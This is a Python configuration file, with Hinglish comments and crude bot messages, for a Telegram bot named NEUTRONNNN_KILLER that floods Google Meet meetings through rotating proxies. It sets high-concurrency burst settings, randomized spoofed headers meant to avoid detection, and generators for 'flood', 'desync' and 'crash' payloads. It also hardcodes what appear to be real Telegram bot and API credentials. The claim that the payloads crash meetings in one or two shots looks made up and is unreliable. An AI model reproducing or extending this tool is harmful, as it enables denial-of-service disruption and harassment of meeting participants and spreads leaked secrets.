# config.py
# NEUTRONNNN_KILLER - COMPLETE CONFIGURATION
# CHUMT KE PYASA, saari settings yahan set kar!

import os
import json
from typing import Dict, List, Any, Optional

# ============================================
# TELEGRAM CREDENTIALS - TERI INFO
# ============================================

# Bot Token - @BotFather se liya
BOT_TOKEN = "8889384636:AAFN5KmUxoyolih52Y0rbwwM8chVD5ZvXs0"

# API Credentials - my.telegram.org se liya
API_ID = 35384207
API_HASH = "09c4bc9de62a417ccdd0c69b33912515"

# Bot Info
BOT_NAME = "NEUTRONNNN_KILLER"
BOT_VERSION = "3.0.0"
BOT_AUTHOR = "@N3UTRON"

# Owner Info
OWNER_ID = None  # Apna Telegram user ID daal (optional)
OWNER_USERNAME = "@N3UTRON"

# ============================================
# ATTACK SETTINGS - POWERFUL PARAMETERS
# ============================================

class AttackConfig:
    """Attack configuration - Jitna powerful chahiye utna bana"""
    
    # Threading / Concurrency - MAX POWER
    MAX_THREADS = 500              # Kitni threads ek saath
    MAX_CONCURRENT = 200           # Ek saath kitne requests
    BATCH_SIZE = 100               # Ek baar mein kitne proxies
    
    # Request settings
    REQUESTS_PER_PROXY = 50        # Har proxy se kitne requests
    REQUEST_TIMEOUT = 2            # Timeout in seconds
    RETRY_COUNT = 2                # Fail ho to kitni baar retry
    
    # Delay settings (to avoid complete ban)
    REQUEST_DELAY_MIN = 0.01       # Minimum delay between requests
    REQUEST_DELAY_MAX = 0.05       # Maximum delay between requests
    PROXY_ROTATE_DELAY = 0.1       # Proxy change ke beech delay
    
    # Payload settings
    PAYLOADS_PER_ATTACK = 5000     # Total payloads in one attack
    PAYLOAD_SIZE_MIN = 500         # Minimum payload size (bytes)
    PAYLOAD_SIZE_MAX = 5000        # Maximum payload size (bytes)
    
    # Attack endpoints - Google Meet vulnerable endpoints
    MEET_ENDPOINTS = [
        '/_/meet/join',
        '/_/meet/sync', 
        '/_/meet/ping',
        '/_/meet/signal',
        '/_/meet/participant',
        '/_/meet/stream',
        '/_/meet/gateway',
        '/_/meet/session'
    ]
    
    # Attack types
    ATTACK_TYPES = {
        'flood': True,           # Gateway flood
        'desync': True,          # Session desync
        'crash': True,           # Meeting crash
        'participant': True,     # Participant flood
        'stream': True           # Stream corruption
    }
    
    # Target response codes that indicate success
    SUCCESS_CODES = [200, 201, 202, 204, 400, 403, 500, 502, 503]
    
    # 1-2 SHOT KILL Settings
    ULTRA_POWER_MODE = True      # Extreme power mode
    BURST_MODE = True             # Burst all requests at once
    NO_DELAY_MODE = False         # Remove all delays (risky)

# ============================================
# PROXY SETTINGS - PROXY KA FULL CONTROL
# ============================================

class ProxyConfig:
    """Proxy configuration - Jo proxy dalega wahi chalega"""
    
    # Proxy check settings
    CHECK_TIMEOUT = 3              # Proxy check timeout (seconds)
    CHECK_CONCURRENT = 200         # Ek saath kitne proxies check karne hain
    CHECK_URL = "https://httpbin.org/ip"  # Proxy test URL
    CHECK_MAX_PROXIES = 500        # Maximum proxies to check at once
    
    # Proxy formats supported
    SUPPORTED_FORMATS = [
        "ip:port",                           # 192.168.1.1:8080
        "protocol://ip:port",                # http://192.168.1.1:8080
        "protocol://user:pass@ip:port"       # http://user:pass@192.168.1.1:8080
    ]
    
    # Proxy protocols
    PROTOCOLS = ['http', 'https', 'socks4', 'socks5']
    
    # Proxy rotation
    ROTATE_ON_FAIL = True          # Fail ho to rotate
    ROTATE_AFTER_REQUESTS = 10     # Har 10 requests baad rotate
    MAX_PROXIES_TO_USE = 100       # Maximum proxies to use in attack
    
    # Proxy sources (file paths)
    PROXY_INPUT_FILE = "proxies.txt"        # Tu yahan proxy file dalega
    PROXY_OUTPUT_LIVE = "live_proxies.txt"  # Live proxy save yahan hoga
    PROXY_OUTPUT_DEAD = "dead_proxies.txt"  # Dead proxy save (optional)
    
    # Proxy validation
    VALIDATE_SSL = False           # SSL validation off for speed
    SKIP_BAD_PROXIES = True        # Bad proxies skip kar do

# ============================================
# FILE PATHS - SAB FILES KA LOCATION
# ============================================

class FileConfig:
    """File paths for everything"""
    
    # Base directory (current folder)
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
    
    # Input files
    PROXY_FILE = os.path.join(BASE_DIR, "proxies.txt")
    
    # Output files
    LIVE_PROXIES_FILE = os.path.join(BASE_DIR, "live_proxies.txt")
    DEAD_PROXIES_FILE = os.path.join(BASE_DIR, "dead_proxies.txt")
    SESSION_FILE = os.path.join(BASE_DIR, "session.json")
    
    # Log files
    LOG_FILE = os.path.join(BASE_DIR, "attack_logs.txt")
    ERROR_LOG_FILE = os.path.join(BASE_DIR, "error_logs.txt")
    ATTACK_STATS_FILE = os.path.join(BASE_DIR, "attack_stats.json")
    
    # Temp files
    TEMP_DIR = os.path.join(BASE_DIR, "temp")
    
    @classmethod
    def ensure_directories(cls):
        """Ensure all directories exist"""
        if not os.path.exists(cls.TEMP_DIR):
            os.makedirs(cls.TEMP_DIR)

# ============================================
# USER SETTINGS - TERI MARZI
# ============================================

class UserConfig:
    """User preferences - Jo tu chahta hai"""
    
    # Bot behavior
    AUTO_START_ATTACK = False        # Meet link milte hi attack start?
    AUTO_SAVE_PROXIES = True         # Proxy auto save?
    AUTO_LOAD_SESSION = True         # Previous session load?
    
    # Display settings
    SHOW_BANNER = True               # Banner dikhana hai?
    SHOW_DETAILED_STATUS = True      # Detailed status?
    SHOW_ATTACK_PROGRESS = True      # Attack progress dikhana?
    
    # CHUMT KA PYASA specific
    ROAST_MODE = True                # Gaali aur roast mode
    EMOJI_MODE = True                # Emojis dikhane hain?
    HINGLISH_MODE = True             # Hinglish mein baat karega?
    
    # Logging
    SAVE_ATTACK_LOGS = True          # Attack logs save karna?
    SAVE_ERROR_LOGS = True           # Error logs save karna?
    MAX_LOG_SIZE_MB = 10             # Max log file size

# ============================================
# RESPONSE MESSAGES - JO BOT BOLEGA
# ============================================

class Messages:
    """Bot ke messages - customize kar sakta hai"""
    
    # Welcome Messages
    START = """
💀 *NEUTRONNNN_KILLER - ULTRA POWER MODE* 💀

😈 CHUMT KE PYASA, main tere command ke liye ready hu!

📋 *Process follow kar:*
1️⃣ 📁 Send proxy file (.txt)
2️⃣ ⚡ FAST Check Proxies
3️⃣ 🎯 Set Meet Link  
4️⃣ 💀 1-2 SHOT ATTACK

⚡ *Features:*
• 500 threads | 50 req/proxy
• 2 sec timeout | Burst mode
• 1-2 shots mein meeting crash

🔥 *Toh chalu kar CHUMT KE PYASA!* 🔥
"""
    
    # Proxy Messages
    PROXY_RECEIVED = """
✅ *Proxy file received!*

📊 Total: `{count}` proxies
📁 File: `{filename}`

⚡ Click 'FAST Check Proxies' now!
"""
    
    PROXY_CHECKING = """
⚡ *Checking proxies at high speed...*

📊 Total: `{total}`
⏳ Progress: `{progress}`

😈 Please wait...
"""
    
    PROXY_CHECK_COMPLETE = """
✅ *Proxy check complete!*

📊 Total checked: `{total}`
✅ Live proxies: `{live}`
💀 Dead proxies: `{dead}`
⚡ Speed: Ultra fast

💾 Saved to: `live_proxies.txt`

🎯 Now set meet link and attack!
"""
    
    NO_PROXY = """
❌ *No proxies found!*

Pehle 'Send Proxy File' button click karke proxy file bhejo!

😈 CHUMT KE PYASA, pehle file daal!
"""
    
    # Meet Link Messages
    MEET_RECEIVED = """
✅ *Meet link set!*

🎯 Target: `{meet_link}`
📊 Live proxies: `{live_proxies}`

💀 Click '1-2 SHOT ATTACK' to destroy!
😈 Meeting ki gaand fattne wali hai!
"""
    
    INVALID_MEET = """
❌ *Invalid meet link!*

Send valid Google Meet link:
`https://meet.google.com/xxx-xxxx-xxx`

😈 Sahi link daal CHUMT KE PYASA!
"""
    
    NO_MEET = """
❌ *No meet link set!*

Pehle 'Set Meet Link' button click karke link bhejo!

😈 CHUMT KE PYASA, pehle link daal!
"""
    
    NO_LIVE_PROXY = """
❌ *No live proxies available!*

Pehle 'FAST Check Proxies' button click karo!

😈 CHUMT KE PYASA, pehle proxy check kar!
"""
    
    # Attack Messages
    ATTACK_START = """
💀 *1-2 SHOT ATTACK STARTED* 💀

🎯 Target: `{meet_link}`
⚡ Proxies: `{proxy_count}` live
💣 Power: ULTRA MAXIMUM

😈 Meeting ki gaand fatt rahi hai...
🔥 Hold tight CHUMT KE PYASA!
"""
    
    ATTACK_PROGRESS = """
💀 *ATTACK IN PROGRESS* 💀

🎯 `{meet_link}`
📊 Progress: `{progress}`
✅ Success: `{success}`

😈 Almost there...
"""
    
    ATTACK_COMPLETE = """
💀 *MEETING CRASHED!* 💀

✅ Status: `SUCCESS`
🎯 Meeting: `{meet_code}`
📊 Success: `{success_count}` requests
❌ Failed: `{failed_count}`
⏱️ Time: `{elapsed}` seconds
⚡ Power: 1-2 SHOT KILL

🔥 *Meeting ki gaand maar di CHUMT KE PYASA!* 🔥

💀 Run /start for new target
"""
    
    ATTACK_PARTIAL = """
⚠️ *ATTACK COMPLETE - PARTIAL* ⚠️

🎯 Meeting: `{meet_code}`
📊 Success: `{success_count}`
❌ Failed: `{failed_count}`

🤡 Proxies weak the CHUMT KE PYASA!
Better proxies la, full power se maarenge!
"""
    
    # Status Messages
    STATUS = """
📊 *POWER STATUS* 📊

📁 Proxies total: `{total_proxies}`
✅ Live proxies: `{live_proxies}`
🎯 Meet target: `{meet_link}`
💀 Attack running: `{attack_active}`
⚡ Power mode: `ULTRA`
🔥 1-2 Shot: `READY`

😈 CHUMT KE PYASA, full power hai!
"""
    
    # Error Messages
    ATTACK_ALREADY_RUNNING = """
⚠️ *Attack already running!*

Please wait for current attack to complete.
😈 Patience rakh CHUMT KE PYASA!
"""
    
    CANCELLED = """
❌ *Cancelled!*

Click /start to continue 😈
"""
    
    ERROR = """
❌ *Error occurred!*

`{error}`

😈 Try again CHUMT KE PYASA!
"""

# ============================================
# HEADERS GENERATOR - BYPASS KE LIYE
# ============================================

class HeaderGenerator:
    """Generate random headers to avoid detection"""
    
    @staticmethod
    def get_random_user_agent() -> str:
        """Random user agent"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 Version/16.0 Mobile/15E148 Safari/604.1'
        ]
        return random.choice(user_agents)
    
    @staticmethod
    def get_random_accept_language() -> str:
        """Random accept language"""
        languages = [
            'en-US,en;q=0.9', 
            'id-ID,id;q=0.9,en;q=0.8',
            'en-GB,en;q=0.9',
            'hi-IN,hi;q=0.9,en;q=0.8'
        ]
        return random.choice(languages)
    
    @staticmethod
    def get_headers(meet_code: str = None) -> Dict[str, str]:
        """Generate complete headers"""
        import random
        headers = {
            'User-Agent': HeaderGenerator.get_random_user_agent(),
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': HeaderGenerator.get_random_accept_language(),
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-Type': 'application/json',
            'Origin': 'https://meet.google.com',
            'Referer': f'https://meet.google.com/{meet_code}' if meet_code else 'https://meet.google.com/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Priority': 'u=1, i'
        }
        return headers

# ============================================
# PAYLOAD GENERATOR - MEETING CRASH KE LIYE
# ============================================

class PayloadGenerator:
    """Generate crash payloads for Google Meet"""
    
    @staticmethod
    def generate_session_id() -> str:
        """Generate random session ID"""
        import random, time
        return f"{random.randint(1000000, 9999999)}-{int(time.time() * 1000)}-{random.randint(1, 999)}"
    
    @staticmethod
    def get_join_payload(meet_code: str) -> Dict:
        """Join payload - massive join request"""
        import random, time
        return {
            'type': 'join',
            'meet_code': meet_code,
            'session_id': PayloadGenerator.generate_session_id(),
            'client_type': random.choice(['WEB', 'ANDROID', 'IOS', 'DESKTOP']),
            'client_version': f"{random.randint(1,99)}.{random.randint(0,9)}.{random.randint(0,99)}",
            'timestamp': int(time.time() * 1000),
            'corrupt': True,
            'overflow': 'X' * random.randint(1000, 5000)
        }
    
    @staticmethod
    def get_sync_payload(meet_code: str) -> Dict:
        """Sync desync payload"""
        import random, time
        return {
            'type': 'sync',
            'meet_code': meet_code,
            'sync_id': random.randint(999999, 999999999),
            'version': random.randint(1, 99999),
            'desync': True,
            'force_crash': True,
            'timestamp': int(time.time() * 1000)
        }
    
    @staticmethod
    def get_flood_payload(meet_code: str, seq: int) -> Dict:
        """Flood payload - data overflow"""
        import random, time
        return {
            'type': 'data',
            'meet_code': meet_code,
            'sequence': seq,
            'data': 'FLOOD_' * random.randint(100, 1000),
            'timestamp': int(time.time() * 1000)
        }
    
    @staticmethod
    def get_participant_payload(meet_code: str) -> Dict:
        """Participant flood payload"""
        import random, time
        return {
            'type': 'participant',
            'meet_code': meet_code,
            'action': 'join_bulk',
            'count': random.randint(50, 200),
            'names': [f'Attacker_{i}' for i in range(100)],
            'flood_mode': True,
            'timestamp': int(time.time() * 1000)
        }
    
    @staticmethod
    def get_crash_payload(meet_code: str) -> Dict:
        """Ultimate crash payload"""
        import random, time
        return {
            'type': 'gateway',
            'meet_code': meet_code,
            'action': 'crash',
            'payload': 'CRASH_MEETING_NOW_' * 500,
            'force': True,
            'bypass': True,
            'timestamp': int(time.time() * 1000)
        }
    
    @staticmethod
    def get_random_payload(meet_code: str, seq: int = 0) -> Dict:
        """Get random payload for attack"""
        import random
        payloads = [
            PayloadGenerator.get_join_payload(meet_code),
            PayloadGenerator.get_sync_payload(meet_code),
            PayloadGenerator.get_flood_payload(meet_code, seq),
            PayloadGenerator.get_participant_payload(meet_code),
            PayloadGenerator.get_crash_payload(meet_code)
        ]
        return random.choice(payloads)

# ============================================
# VALIDATION FUNCTION
# ============================================

def validate_config() -> bool:
    """Check if configuration is valid"""
    import random  # Add this for the PayloadGenerator calls
    
    errors = []
    warnings = []
    
    # Check Telegram credentials
    if not BOT_TOKEN or len(BOT_TOKEN) < 40:
        errors.append("❌ BOT_TOKEN is invalid or missing!")
    
    if not API_ID or not isinstance(API_ID, int):
        errors.append("❌ API_ID must be an integer!")
    
    if not API_HASH or len(API_HASH) != 32:
        errors.append("❌ API_HASH must be 32 characters!")
    
    # Check attack settings
    if AttackConfig.MAX_THREADS > 1000:
        warnings.append("⚠️ MAX_THREADS > 1000 may cause rate limiting!")
    
    if AttackConfig.REQUEST_TIMEOUT < 1:
        warnings.append("⚠️ REQUEST_TIMEOUT < 1 may cause false failures!")
    
    # Ensure directories exist
    FileConfig.ensure_directories()
    
    # Print results
    if errors:
        print("\n❌ CONFIGURATION ERRORS:")
        for error in errors:
            print(f"   {error}")
        return False
    
    if warnings:
        print("\n⚠️ CONFIGURATION WARNINGS:")
        for warning in warnings:
            print(f"   {warning}")
    
    print("\n✅ Configuration validated successfully!")
    print(f"   Bot Name: {BOT_NAME}")
    print(f"   Version: {BOT_VERSION}")
    print(f"   Author: {BOT_AUTHOR}")
    print(f"   Power Mode: {'ON' if AttackConfig.ULTRA_POWER_MODE else 'OFF'}")
    print(f"   Max Threads: {AttackConfig.MAX_THREADS}")
    
    return True

# ============================================
# SAVE/LOAD FUNCTIONS
# ============================================

def save_session(data: Dict):
    """Save session data to file"""
    try:
        with open(FileConfig.SESSION_FILE, 'w') as f:
            json.dump(data, f, indent=2)
        return True
    except:
        return False

def load_session() -> Optional[Dict]:
    """Load session data from file"""
    try:
        if os.path.exists(FileConfig.SESSION_FILE):
            with open(FileConfig.SESSION_FILE, 'r') as f:
                return json.load(f)
    except:
        pass
    return None

# ============================================
# EXPORTS
# ============================================

__all__ = [
    'BOT_TOKEN',
    'API_ID',
    'API_HASH',
    'BOT_NAME',
    'BOT_VERSION',
    'BOT_AUTHOR',
    'OWNER_ID',
    'OWNER_USERNAME',
    'AttackConfig',
    'ProxyConfig',
    'FileConfig',
    'UserConfig',
    'Messages',
    'HeaderGenerator',
    'PayloadGenerator',
    'validate_config',
    'save_session',
    'load_session'
]

# ============================================
# RUN VALIDATION ON IMPORT
# ============================================

if __name__ == "__main__":
    print("🔍 NEUTRONNNN_KILLER - Config Validation")
    print("=" * 50)
    validate_config()
    print("\n😈 CHUMT KE PYASA, config ready hai!")
else:
    # Auto-validate when imported
    import random
    validate_config()